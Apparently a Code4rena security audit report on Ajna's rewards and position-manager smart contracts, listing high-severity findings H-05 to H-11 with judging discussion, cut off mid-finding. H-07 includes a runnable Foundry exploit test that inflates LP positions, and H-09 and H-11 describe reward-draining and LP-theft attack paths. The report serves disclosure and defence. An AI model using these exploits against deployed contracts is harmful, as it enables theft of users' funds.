File:2023-05-ajna\ajna-core\src\RewardsManager.sol73:/// @dev `epoch => rewards claimed` mapping.74:mapping(uint256 =>uint256) public override rewardsClaimed;75:/// @dev `epoch => update bucket rate rewards claimed` mapping.76:mapping(uint256 =>uint256) public override updateRewardsClaimed;
And therewardsCapcalculation when calculating the reward applies only to the pool, which leads to a situation when the condition is fulfilledrewardsClaimedInEpoch + updatedRewards_ >= rewardsCap,ButrewardsCapis less thanrewardsClaimedInEpoch:
File: 2023-05-ajna\ajna-core\src\RewardsManager.sol-543:         uint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod);545:         // Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed.-546:         if (rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped) {548:             // set claim reward to difference between cap and reward-549:             newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; // @audit rewardsCapped can be less then  rewardsClaimedInEpoch_550:         }719:         uint256 rewardsCap            = Maths.wmul(UPDATE_CAP, totalBurned); // @audit in one pool-720:        uint256 rewardsClaimedInEpoch = updateRewardsClaimed[curBurnEpoch];722:         // update total tokens claimed for updating bucket exchange rates tracker723:         if (rewardsClaimedInEpoch + updatedRewards_ >= rewardsCap) {724:              // if update reward is greater than cap, set to remaining difference-725:             updatedRewards_ = rewardsCap - rewardsClaimedInEpoch; // @audit rewardsCap can be less then rewardsClaimedInEpoch726:         }728:         // accumulate the full amount of additional rewards-729:        updateRewardsClaimed[curBurnEpoch] += updatedRewards_; // @audit increase per epoch
Which causes anunderflowerorr in the resultupdatedRewards_ = rewardsCap - rewardsClaimedInEpochwhererewardsCap < rewardsClaimedInEpoch, this errorleads to a transaction fail, which will further temporarily/permanently block actions with NFT asunstake/claimRewardsfor pools in whichrewardsCapwill fail less than the totalrewardsClaimedInEpoch.
We have 2 instances of this problem::
during the call_calculateNewRewardsduring the call_updateBucketExchangeRates
A failure in any of these will result in users of certain pools being unable to withdraw their NFTs as well as the reward.
Proof of Concept
Let’s take a closer look at the problem and why this is possible:
We have a general calculation of rewards taken per epoch:
File:ajna-core\src\RewardsManager.sol71:/// @dev `epoch => rewards claimed` mapping.72:mapping(uint256=>uint256)publicoverriderewardsClaimed;73:/// @dev `epoch => update bucket rate rewards claimed` mapping.74:mapping(uint256=>uint256)publicoverrideupdateRewardsClaimed;
The state is updated for the epoch by the amount calculated for each pool:
File:ajna-core\src\RewardsManager.sol_calculateAndClaimRewards396:for(uint256epoch=lastClaimedEpoch;epoch<epochToClaim_; ) {410:// update epoch token claim trackers411:rewardsClaimed[epoch]           +=nextEpochRewards;413:         }_updateBucketExchangeRates676:uint256curBurnEpoch=IPool(pool_).currentBurnEpoch();728:// accumulate the full amount of additional rewards729:updateRewardsClaimed[curBurnEpoch] +=updatedRewards_;
At the time of calculation of the reward for the update:
File: 2023-05-ajna\ajna-core\src\RewardsManager.sol526:         (527:             ,528:             // total interest accumulated by the pool over the claim period+529:             uint256 totalBurnedInPeriod,530:             // total tokens burned over the claim period531:             uint256 totalInterestEarnedInPeriod532:         ) = _getPoolAccumulators(ajnaPool_, nextEpoch_, epoch_);533:534:         // calculate rewards earned...542:+543:         uint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod);544:545:         // Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed.546:         if (rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped) {547:548:             // set claim reward to difference between cap and reward+549:             newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; // @audit550:         }
We have a situation whererewardsClaimedInEpoch_has been updated by other pools to something like100e18,
andrewardsCappedfor the other pool was30e18, resulting in:rewardsClaimedInEpoch_ + newRewards_ > rewardsCappedand of course we catch the underflow at the time of calculating the remainder,30e18 - 100e18, since there is no remaindernewRewards_ = rewardsCapped - rewardsClaimedInEpoch_.
To check the problem, you need to raiserewardsClaimedInEpoch_more than therewardsCapof a certain pool, with the help of other pools,rewardsCapis a percentage of burned tokens in the pool… so it’s possible.
Tools Used
Manual reviewFoundry
Recommended Mitigation Steps
Add additional requirements that ifrewardsClaimedInEpoch > rewardsCapthatupdatedRewards_should be zero, not need calculate remaining difference.
MikeHathaway (Ajna) confirmed
Picodes (judge) decreased severity to Medium and commented:
Giving Medium severity for “Assets not at direct risk, but the function of the protocol or its availability could be impacted”
Haipls (warden) commented:
Hi @Picodes - I would like to ask you to reconsider the severity of the issue. You’ve classified it asMed-Assets not at direct risk, but the function of the protocol or its availability could be impacted.Upon review, in my opinion, this issue leans more towards HIGH -Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).Below, I will attempt to present my reasoning and why I think this way:I’ve considered2metrics to determine severity:ConsequencesThe likelihood of it happeningAnd came up with the following results:ConsequencesThe consequence of this issue is that in the event of it happening, NFTs are blocked on the RewardsManager.sol contract with no possibility of their further withdrawal. This is critical and falls under:Assets can be stolen/lost/compromised directly. Moreover, these are not just NFTs, they are LP positions.When this problem occurs, the ability forstake/unstake/claimRewardsof the affected pools is closed due to a mathematical error, leading to a simple blockage of interaction with these pools. As it becomes impossible to process the reward update for a given epoch. For pools that weren’t affected and managed to process before, they will be able to operate further until the situation repeats.The main point in deciding whether it’sMedium/Highis how likely this problem is to occur.Here I looked at the dependence in calculations on the number of poolsuint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod);// Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed.if(rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped) {// set claim reward to difference between cap and rewardnewRewards_ = rewardsCapped - rewardsClaimedInEpoch_;}rewardsClaimedInEpoch_is a value that sums up across all poolsrewardsCappedis a value related to the calculation of a single pool and depends on the number of coins burned in the epoch in the selected poolAnd there arises a situation whenn1 - (n2 + n3...+ nn)by pools. In reality, it’s all more complex and depends on the number of burned coins in the pools, but the essence is that the more pools we have, the higher the chances that this condition simply reverts. And this is no longer an unlikely situation.Also an example of a highly probable situation:When there’s a HUGE pool and several small ones in the middle. It’s enough for only the HUGE pool to update the epoch’s reward. This will cause a problem with the condition’s execution for all other small poolsThis can also be a vector of an attacker who purposely burns an extra amount of coins to increase the reward update on the pool. And causes positions blocking in the contract.After these considerations, I would like you to reconsider the severity of the problem, as we have two points:Direct blocking of funds on the contract.The situation is not theoretical.I hope my thoughts will be useful. I understand that I can be wrong and I hope you can clarify if I am not understanding something correctly. Thank you.
Picodes (judge) increased severity to High and commented:
Hi @Haipls - thanks for your comment. Upon review, I agree with your take and will upgrade to High.

[H-06] The lender could possibly lose unclaimed rewards in case a bucket goes bankrupt
Submitted byKoolex
When the lender callsPositionManager.memorializePositionsmethod the following happens:
Records bucket indexes along with its deposit times and lpBalancesTransfers LP ownership from the lender to PositionManager contract.
In point 1, it checks if there is a previous deposit and the bucket went bankrupt after prior memorialization, then it zero out the previous tracked LP. However, the lender could still have unclaimed rewards. In this case, the lender loses the rewards due to the lack of claiming rewards before zeroing out the previous tracked LP balance. If you check claim rewards functionality in RewardsManager, the bucket being not bankrupt is not a requirement. Please note that claiming rewards relies on the tracked LP balance in PositionManager.
Proof of Concept
PositionManager.memorializePositionsmethodcheck for previous deposits and zero out the previous tracked LP if bucket is bankrupt// check for previous depositsif (position.depositTime != 0) {// check that bucket didn't go bankrupt after prior memorializationif (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {// if bucket did go bankrupt, zero out the LP tracked by position managerposition.lps = 0;}}<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L192-L199>In RewardsManager, checkclaimRewardsand_claimRewardsmethod. there is no a check for bucket’s bankruptcy.https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L114https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L561
Recommended Mitigation Steps
On memorializePositions, check if the lender already claimed his/her rewards before zeroing out the previous tracked LP.
ith-harvey (Ajna) disputed
grandizzy (Ajna) commented:
That is by design and we acknowledge that documentation of bucket bankruptcy can be improved. When a bucket goes bankrupt (which shouldn’t happen often but only when there’s bad debt in pool to settle) the lender won’t lose only their rewards but will also lose all the shares in that bucket / LP (which has higher impact than rewards).Also the recommendation of:On memorializePositions, check if the lender already claimed his/her rewards before zeroing out the previous tracked LP.Would imply making position manager contract aware of rewards manager contract and we don’t want to couple those 2 in reference implementation. However, additional position and rewards manager could be developed by 3rd parties and could take into consideration this recommendation.

[H-07] User can exponentially increase the value of their position through thememorializePositionsfunction
Submitted byBPZ, also found bysces60107,xuwinnie,Koolex,ast3ros,Haipls, andSpicyMeatball
ThePositionManager contractallows a lender to mint an NFT that will be representative of their lp positions. This is done bymintingan NFT and then invoking thememorializePositions functionwhich will assign their lp positions to the respective NFT. However, while the memorializePositions function will update the lp balances based on theentiretyof the lender’s lp balance for a given index bucket within the pool, thePool contractwill update the lender’s balance based on theminimum valuebetween the allowed amount and the lender’s balance. This means that, if a user specifies an allowance for the PositionManager contract by calling theincreaseLPAllowance functionthat is less than their total balance for a respective position before invoking the memorializePositions function, their position’s lp balance tracked by thePositionManager’s statewill increase by the entirety of their balance while their position that is tracked by thePool’s statewill only decrease by the specified allowance. The impact of this is that a lender can exponentially increase the value of their position by repeating the steps of specifying a minimum allowance for the PositionManager for their positions and then invoking memorializePositions until their lp position that is tracked by the Pool’s state is 0. The lender can thenstakethis exponentially overvalued position through theRewardsManager contractallowing them to receive substantially more rewards for their position then should be allotted. The direct implications of this are that the user will be rewarded a substantial amount of AJNA reward tokens which are directly redeemable for the Pool’s quote tokens through its Redeemable Reserve and, additionally, over-value the user’s influence on the protocol’s proposal funding because a user’s votes are weighted by the amount of AJNA tokens they hold. We believe this to be a high severity vulnerability because it directly affects user funds and the functionality of the protocol in general.
Proof of Concept
The described vulnerability occurs when a lender specifies allowances for the PositionManager contract that are less than their lp balance for each respective index through theincreaseLPAllowance functionand then invokes thememorializePositions function. The result of this is that the user’s lp balance tracked by thePositionManager’s statewill increment by the position’s balance while the lp balance tracked by thePool’s statewill only decrement by the specified allowance. A user can repeat this process through multiple iterations until their respective lp balances with the Pool contract are 0 which will exponentially increase the value of their position.    Please see the following test case for a POC simulating the effect of this described vulnerability on a user’s position:
// SPDX-License-Identifier: UNLICENSEDpragmasolidity0.8.14;import"forge-std/console.sol";import{Base64}from"@base64-sol/base64.sol";import"tests/forge/unit/PositionManager.t.sol";/***@titleProof of Concept*@noticeSimulates the effect of the described vulnerability where a user*          can exponentially increase the value of their position by:*          1- only approving the`PositionManager`for a min amount of their position*          2- invoking 'memorializePositions' on their position's respective NFT*          3- repeating these steps until their respective position's Pool lp balance is 0*@devThis test case can be implemented and run from the ajna-core/tests/forge directory*/contractPOCisPositionManagerERC20PoolHelperContract{functiontestMemorializePositionsWithMinApproval()external{uint256intialLPBalance;uint256finalLPBalance;addresstestsAddress=makeAddr("testsAddress");uint256mintAmount=10000*1e18;_mintQuoteAndApproveManagerTokens(testsAddress,mintAmount);// Call pool contract directly to add quote tokensuint256[]memoryindexes=newuint256[](3);indexes[0] =2550;indexes[1] =2551;indexes[2] =2552;_addInitialLiquidity({from:testsAddress,amount:3_000*1e18,index:indexes[0]});_addInitialLiquidity({from:testsAddress,amount:3_000*1e18,index:indexes[1]});_addInitialLiquidity({from:testsAddress,amount:3_000*1e18,index:indexes[2]});// Mint an NFT to later memorialize existing positions into.uint256tokenId=_mintNFT(testsAddress,testsAddress,address(_pool));// Pool lp balances before.(uint256poolLPBalanceIndex1, ) =_pool.lenderInfo(indexes[0],testsAddress);(uint256poolLPBalanceIndex2, ) =_pool.lenderInfo(indexes[1],testsAddress);(uint256poolLPBalanceIndex3, ) =_pool.lenderInfo(indexes[2],testsAddress);console.log("\nPool lp balances before:");console.log("bucket %s: %s",indexes[0],poolLPBalanceIndex1);console.log("bucket %s: %s",indexes[1],poolLPBalanceIndex2);console.log("bucket %s: %s",indexes[2],poolLPBalanceIndex3);intialLPBalance=poolLPBalanceIndex1+poolLPBalanceIndex2+poolLPBalanceIndex3;// PositionManager lp balances before.(uint256managerLPBalanceIndex1, ) =_positionManager.getPositionInfo(tokenId,indexes[0]);(uint256managerLPBalanceIndex2, ) =_positionManager.getPositionInfo(tokenId,indexes[1]);(uint256managerLPBalanceIndex3, ) =_positionManager.getPositionInfo(tokenId,indexes[2]);console.log("\nPositionManger lp balances before:");console.log("bucket %s: %s",indexes[0],managerLPBalanceIndex1);console.log("bucket %s: %s",indexes[1],managerLPBalanceIndex1);console.log("bucket %s: %s",indexes[2],managerLPBalanceIndex1);console.log("\n<--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->");// Approve the PositionManager for only 1 token in each bucket.uint256[]memoryamounts=newuint256[](3);amounts[0] =1*1e18;amounts[1] =1*1e18;amounts[2] =1*1e18;// Continuosly invoke memorializePositions with the min allowance// until Pool lp balance is 0.while(poolLPBalanceIndex1!=0&&poolLPBalanceIndex2!=0&&poolLPBalanceIndex3!=0) {// Increase manager allowance._pool.increaseLPAllowance(address(_positionManager),indexes,amounts);// Memorialize quote tokens into minted NFT.IPositionManagerOwnerActions.MemorializePositionsParamsmemorymemorializeParams=IPositionManagerOwnerActions.MemorializePositionsParams(tokenId,indexes);_positionManager.memorializePositions(memorializeParams);// Get new Pool lp balances.(poolLPBalanceIndex1, ) =_pool.lenderInfo(indexes[0],testsAddress);(poolLPBalanceIndex2, ) =_pool.lenderInfo(indexes[1],testsAddress);(poolLPBalanceIndex3, ) =_pool.lenderInfo(indexes[2],testsAddress);}// Pool lp balances after.console.log("\nPool lp balances after:");console.log("bucket %s: %s",indexes[0],poolLPBalanceIndex1);console.log("bucket %s: %s",indexes[1],poolLPBalanceIndex2);console.log("bucket %s: %s",indexes[2],poolLPBalanceIndex3);// PositionManager lp balances after.(managerLPBalanceIndex1, ) =_positionManager.getPositionInfo(tokenId,indexes[0]);(managerLPBalanceIndex2, ) =_positionManager.getPositionInfo(tokenId,indexes[1]);(managerLPBalanceIndex3, ) =_positionManager.getPositionInfo(tokenId,indexes[2]);console.log("\nPositionManger lp balances after:");console.log("bucket %s: %s",indexes[0],managerLPBalanceIndex1);console.log("bucket %s: %s",indexes[1],managerLPBalanceIndex1);console.log("bucket %s: %s\n",indexes[2],managerLPBalanceIndex1);finalLPBalance=managerLPBalanceIndex1+managerLPBalanceIndex2+managerLPBalanceIndex3;// Assert that the initial and ending balances are equal.assertEq(intialLPBalance,finalLPBalance);}}
For reference the log outputs that display the overall change in the users position are the following:
Pool lp balances before:bucket 2550: 3000000000000000000000bucket 2551: 3000000000000000000000bucket 2552: 3000000000000000000000PositionManger lp balances before:bucket 2550: 0bucket 2551: 0bucket 2552: 0<--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->Pool lp balances after:bucket 2550: 0bucket 2551: 0bucket 2552: 0PositionManger lp balances after:bucket 2550: 4501500000000000000000000bucket 2551: 4501500000000000000000000bucket 2552: 4501500000000000000000000Error: a == b not satisfied [uint]Expected: 13504500000000000000000000Actual: 9000000000000000000000
The test case simulates a user that has created a position by providing 9,000 tokens as liquidity into a pool depositing 3,000 tokens, each, into price buckets 2550, 2551, and 2552. An NFT is then minted for the user. The test case then iteratively approves the PositionManager contract for an allowance of 1 token for each price bucket and invokes the memorializePositions function, repeating these steps until the Pool lp balance for their positions are 0. As can be seen by the log output, the value of the position per price bucket dramatically increases with the position in each bucket being valued at 4,501,500 tokens by the end of the test. In total, the user’s position has increased in value from 9,000 tokens to 13,504,500 tokens.
Tools Used
Foundry
Recommended Mitigation Steps
It is recommended to implement a check within thememorializePositions functionthat will ensure that a user has specified an allowance at least equal to their lp balance at each respective index, reverting with a custom error if not true. For example, the function could be refactored to the following where the mentioned check is implementedhere:
functionmemorializePositions(MemorializePositionsParamscalldataparams_)externaloverride{EnumerableSet.UintSetstoragepositionIndex=positionIndexes[params_.tokenId];IPoolpool=IPool(poolKey[params_.tokenId]);addressowner=ownerOf(params_.tokenId);uint256indexesLength=params_.indexes.length;uint256index;for(uint256i=0;i<indexesLength; ) {index=params_.indexes[i];// record bucket index at which a position has added liquidity// slither-disable-next-line unused-returnpositionIndex.add(index);(uint256lpBalance,uint256depositTime) =pool.lenderInfo(index,owner);// check that specified allowance is at least equal to the lp balanceuint256allowance=pool.lpAllowance(index,address(this),owner);if(allowance<lpBalance)revertAllowanceTooLow();Positionmemoryposition=positions[params_.tokenId][index];// check for previous depositsif(position.depositTime!=0) {// check that bucket didn't go bankrupt after prior memorializationif(_bucketBankruptAfterDeposit(pool,index,position.depositTime)) {// if bucket did go bankrupt, zero out the LP tracked by position managerposition.lps=0;}}// update token position LPposition.lps+=lpBalance;// set token's position deposit time to the original lender's deposit timeposition.depositTime=depositTime;// save position in storagepositions[params_.tokenId][index] =position;unchecked{ ++i; }}// update pool LP accounting and transfer ownership of LP to PositionManager contractpool.transferLP(owner,address(this),params_.indexes);emitMemorializePosition(owner,params_.tokenId,params_.indexes);}
MikeHathaway (Ajna) confirmed

[H-08] Claiming accumulated rewards while the contract is underfunded can lead to a loss of rewards
Submitted byaviggiano, also found by0xSmartContract,Evo,Jerry0x,tsvetanovv,Audinarey,kenta,0xcm,patitonar,sakshamguruji,BGSecurity,Audit_Avengers,mrvincere,bytes032,devscrooge,Haipls,Dug,ladboy233,Bauchibred,Bauchibred,Bauchibred,0xTheC0der,ABAIKUNANBAEV, andTS
The claimable rewards for an NFT staker are capped at the Ajna token balance at the time of claiming, which can lead to a loss of rewards if theRewardsManagercontract is underfunded with Ajna tokens.
Impact
Loss of rewards if theRewardsManagercontract is underfunded with Ajna tokens.
Proof of Concept
TheRewardsManagercontract keeps track of the rewards earned by an NFT staker. The accumulated rewards are claimed by calling theRewardsManager.claimRewardsfunction. Internally, theRewardsManager._claimRewardsfunction transfers the accumulated rewards to the staker.
However, the transferrable amount of Ajna token rewards are capped at the Ajna token balance at the time of claiming. If the accumulated rewards are higher than the Ajna token balance, the claimer will receive fewer rewards than expected. The remaining rewards cannot be claimed at a later time as theRewardsManagercontract does not keep track of the rewards that were not transferred.
Note
This issue was already reported onSherlock’s audit contest, and was marked asFixedby the Ajna team (Issue M-8).
Nevertheless, the problem still exists, as it can be seen through the following test:
diff --git a/ajna-core/src/RewardsManager.sol b/ajna-core/src/RewardsManager.solindex 314b476..6642a4e 100644--- a/ajna-core/src/RewardsManager.sol+++ b/ajna-core/src/RewardsManager.sol@@ -582,6 +582,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {epochToClaim_);+        // @audit-issue rewardsEarned (ClaimReward event) is not necessarily what's transferred (Transfer event)emit ClaimRewards(msg.sender,ajnaPool_,@@ -812,6 +813,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {// check that rewards earned isn't greater than remaining balance// if remaining balance is greater, set to remaining balanceuint256 ajnaBalance = IERC20(ajnaToken).balanceOf(address(this));+        // @audit-issue rewardsEarned (ClaimReward event) is not necessarily what's transferred (Transfer event)if (rewardsEarned_ > ajnaBalance) rewardsEarned_ = ajnaBalance;if (rewardsEarned_ != 0) {diff --git a/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol b/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.solindex 93fe062..74a70d5 100644--- a/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol+++ b/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol@@ -162,6 +162,8 @@ abstract contract RewardsDSTestPlus is IRewardsManagerEvents, ERC20HelperContracuint256 currentBurnEpoch = IPool(pool).currentBurnEpoch();vm.expectEmit(true, true, true, true);emit ClaimRewards(from, pool, tokenId, epochsClaimed, reward);+        vm.expectEmit(true, true, true, true);+        emit Transfer(address(_rewardsManager), from, reward);_rewardsManager.claimRewards(tokenId, currentBurnEpoch);assertEq(_ajnaToken.balanceOf(from), fromAjnaBal + reward);@@ -267,8 +269,8 @@ abstract contract RewardsHelperContract is RewardsDSTestPlus {_poolTwo       = ERC20Pool(_poolFactory.deployPool(address(_collateralTwo), address(_quoteTwo), 0.05 * 10**18));// provide initial ajna tokens to staking rewards contract-        deal(_ajna, address(_rewardsManager), 100_000_000 * 1e18);-        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 100_000_000 * 1e18);+        deal(_ajna, address(_rewardsManager), 40 * 1e18);+        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 40 * 1e18); // @audit-issue RewardsManager is now underfunded, contains less AJNA than users' rewards}// create a new test borrower with quote and collateral sufficient to draw a specified amount of debtdiff --git a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.solindex 4100e9f..3eaacd7 100644--- a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol+++ b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol@@ -1843,6 +1843,15 @@ contract RewardsManagerTest is RewardsHelperContract {});assertLt(_ajnaToken.balanceOf(_minterOne), tokensToBurn);++        // try to claim again and get remaining rewards, will revert with `AlreadyClaimed()`+        _claimRewards({+            pool:          address(_pool),+            from:          _minterOne,+            tokenId:       tokenIdOne,+            reward:        40.899689081331351737 * 1e18,+            epochsClaimed: _epochsClaimedArray(1, 0)+        });}/********************/
Since the problem still exists, I am reporting it here. You can find below a conversation with Ian Harvey from the Ajna team, where we discuss how the problem was incorrectly marked as solved:
aviggiano — Yesterday at 4:37 PM
Hi thereI am reviewing the Ajna smart contracts and I have a question regarding previous audit reports.https://github.com/ajna-finance/auditsIt seems like some findings are marked as “Fixed” but I believe they were not (see M-8).Should I re-submit a previous finding, if the contract is in scope? or are those considered out of scope?M-8 is this onehttps://github.com/sherlock-audit/2023-01-ajna-judging/issues/120Ian Harvey | Ajna — Yesterday at 7:01 PMCheckingIan Harvey | Ajna — Yesterday at 7:11 PMThat was solved here ->https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L811
Tools Used
Past audit report
Recommended Mitigation Steps
Consider reverting if there are insufficient Ajna tokens available as rewards. This is the best immediate solution to the problem.Create unit tests for each issue identified in the audit report and confirm that it has been properly addressed. This will prevent recurring problems where the development team believes an issue has been resolved, but in reality, it has not.Create a separate pull request for each finding and mark the issue in the audit table. This will help developers and auditors verify whether the issue has been resolved or not, and will make future audits more manageable, ultimately improving the overall quality and security of the protocol.
Picodes (judge) increased severity to High
MikeHathaway (Ajna) confirmed via duplicate issue#361

[H-09] User can avoid bankrupting by callingPositionManager.moveLiquiditywhere to index is bankrupted index
Submitted byrvierdiiev, also found byJ4de,SpicyMeatball, andvolodya
Bucket could become insolvent and in that case all LP within the bucket are zeroed out (lenders lose all their LP). Because of that,PositionManager.reedemPositionswill not allow to redeem index that is bankrupted.
When user wants to move his LPs from one bucket to another he can callPositionManager.moveLiquiditywhere he will provide from and to indexes.
https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L262-L333
functionmoveLiquidity(MoveLiquidityParamscalldataparams_)externaloverridemayInteract(params_.pool, params_.tokenId)nonReentrant{PositionstoragefromPosition=positions[params_.tokenId][params_.fromIndex];MoveLiquidityLocalVarsmemoryvars;vars.depositTime=fromPosition.depositTime;// handle the case where owner attempts to move liquidity after they've already done soif(vars.depositTime==0)revertRemovePositionFailed();// ensure bucketDeposit accounts for accrued interestIPool(params_.pool).updateInterest();// retrieve info of bucket from which liquidity is moved(vars.bucketLP,vars.bucketCollateral,vars.bankruptcyTime,vars.bucketDeposit,) =IPool(params_.pool).bucketInfo(params_.fromIndex);// check that bucket hasn't gone bankrupt since memorializationif(vars.depositTime<=vars.bankruptcyTime)revertBucketBankrupt();// calculate the max amount of quote tokens that can be moved, given the tracked LPvars.maxQuote=_lpToQuoteToken(vars.bucketLP,vars.bucketCollateral,vars.bucketDeposit,fromPosition.lps,vars.bucketDeposit,_priceAt(params_.fromIndex));EnumerableSet.UintSetstoragepositionIndex=positionIndexes[params_.tokenId];// remove bucket index from which liquidity is moved from tracked positionsif(!positionIndex.remove(params_.fromIndex))revertRemovePositionFailed();// update bucket set at which a position has liquidity// slither-disable-next-line unused-returnpositionIndex.add(params_.toIndex);// move quote tokens in pool(vars.lpbAmountFrom,vars.lpbAmountTo,) =IPool(params_.pool).moveQuoteToken(vars.maxQuote,params_.fromIndex,params_.toIndex,params_.expiry);PositionstoragetoPosition=positions[params_.tokenId][params_.toIndex];// update position LP statefromPosition.lps-=vars.lpbAmountFrom;toPosition.lps+=vars.lpbAmountTo;// update position deposit time to the from bucket deposit timetoPosition.depositTime=vars.depositTime;emitMoveLiquidity(ownerOf(params_.tokenId),params_.tokenId,params_.fromIndex,params_.toIndex,vars.lpbAmountFrom,vars.lpbAmountTo);}
As you can seefrombucket is checked to be not bankrupted before the moving.And after the move, LPs offromandtobuckets are updated.AlsodepositTimeoftobucket is updated tofrom.depositTime.
The problem here is thattobucket was never checked to be not bankrupted.Because of that it’s possible that bankruptedtobucket now becomes not bankrupted as their depositTime is updated now.
This is how this can be used by attacker.
Attacker has lp shares in the bucket, linked to token and this bucket became bankrupt.Then attacker mints small amount of LP in the Pool and then memorizes this index to the token.Attacker callsmoveLiquiditywithfrom: new bucket andto: bankrupt bucket.Now attacker can redeem his lp shares from bankrupt bucket as depositedTime is updated now.
As result, attacker was able to steal LPs of another people fromPositionManagercontract.
Tools Used
VsCode
Recommended Mitigation Steps
In case iftobucket is bankrupt, then clear LP for it before adding moved lp shares.
MikeHathaway (Ajna) confirmed

[H-10] missingisEpochClaimedvalidation
Submitted byJorgect, also found byshealtielanzandABAIKUNANBAEV
User can claim rewards even when is already claimed
Proof of Concept
The _claimRewards function is using to calculate and send the reward to the caller but this function is no validating if isEpochClaimed mapping is true due that in claimRewards function is validated, see the stament in the following lines:
file: ajna-core/src/RewardsManager.solfunction claimRewards(uint256 tokenId_,uint256 epochToClaim_) external override {StakeInfo storage stakeInfo = stakes[tokenId_];if (msg.sender != stakeInfo.owner) revert NotOwnerOfDeposit();if (isEpochClaimed[tokenId_][epochToClaim_]) revert AlreadyClaimed(); // checking if the epoch was claimed;_claimRewards(stakeInfo,tokenId_,epochToClaim_,true,stakeInfo.ajnaPool);}
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L114-L125
Now the moveStakedLiquidity is calling _claimRewards too without validate isEpochClaimed mapping:
file: ajna-core/src/RewardsManager.solfunction moveStakedLiquidity(uint256 tokenId_,uint256[] memory fromBuckets_,uint256[] memory toBuckets_,uint256 expiry_) external override nonReentrant {StakeInfo storage stakeInfo = stakes[tokenId_];if (msg.sender != stakeInfo.owner) revert NotOwnerOfDeposit();uint256 fromBucketLength = fromBuckets_.length;if (fromBucketLength != toBuckets_.length)revert MoveStakedLiquidityInvalid();address ajnaPool = stakeInfo.ajnaPool;uint256 curBurnEpoch = IPool(ajnaPool).currentBurnEpoch();// claim rewards before moving liquidity, if any_claimRewards(stakeInfo, tokenId_, curBurnEpoch, false, ajnaPool); // no checking is isEpochClaimed is true and revert
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L135-L159
Also we can see in the _claimRewards function there is no validation is isEpochClaimed is true, this allow  a malicius user claimReward first and then move his liquidity to other bucket or the same bucket claiming the reward each time that he want.
function _claimRewards(StakeInfo storage stakeInfo_,uint256 tokenId_,uint256 epochToClaim_,bool validateEpoch_,address ajnaPool_) internal {// revert if higher epoch to claim than current burn epochif (validateEpoch_ &&epochToClaim_ > IPool(ajnaPool_).currentBurnEpoch()) revert EpochNotAvailable();// update bucket exchange rates and claim associated rewardsuint256 rewardsEarned = _updateBucketExchangeRates(ajnaPool_,positionManager.getPositionIndexes(tokenId_));rewardsEarned += _calculateAndClaimRewards(tokenId_, epochToClaim_);uint256[] memory burnEpochsClaimed = _getBurnEpochsClaimed(stakeInfo_.lastClaimedEpoch,epochToClaim_);emit ClaimRewards(msg.sender,ajnaPool_,tokenId_,burnEpochsClaimed,rewardsEarned);// update last interaction burn eventstakeInfo_.lastClaimedEpoch = uint96(epochToClaim_);// transfer rewards to sender_transferAjnaRewards(rewardsEarned);}
Recommended Mitigation Steps
Check if the isEpochClaime is true and revert in the _claimReward function
if (isEpochClaimed[tokenId_][epochToClaim_]) revert AlreadyClaimed();
ith-harvey (Ajna) disputed and commented:
The series of calls they are suggesting are possible:stakeclaimRewards() -> get rewardsmoveStakedLiquidity() ->  get rewardsThey should not be able to get these rewards because_calculateAndClaimRewards()iterates from last claimed epoch.

[H-11] RewardsManager fails to validatepool_when updating exchange rates allowing rewards to be drained
Submitted byvakzz, also found by0xWaitress,SpicyMeatball, and0xStalin
https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L310-L318https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L794-L794https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L811-L821
TheupdateBucketExchangeRatesAndClaimmethod is designed to reward people for keeping the current exchange rate up to date (it has the following description: “Caller can claim5%of the rewards that have accumulated to each bucket since the last burn event, if it hasn’t already been updated”).
The issue is that there is no check on thepool_to ensure that is a valid ajna pool or that it is a pool from a currently staked token.
This means that an attacker can supply their own contract to control all of the values used to calculate the reward amount, allowing them to transfer an arbitrary amount of reward tokens (up to the balance of the rewards manager).
Proof of Concept
